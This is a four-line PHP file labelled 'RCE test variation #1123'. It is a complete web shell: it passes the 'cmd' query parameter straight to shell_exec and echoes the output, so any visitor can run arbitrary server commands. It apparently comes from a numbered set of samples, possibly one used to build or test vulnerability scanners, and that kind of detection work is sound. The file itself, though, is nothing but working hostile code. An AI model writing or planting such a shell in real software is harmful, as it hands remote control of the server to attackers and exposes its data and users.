<?php
// RCE test variation #1123
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>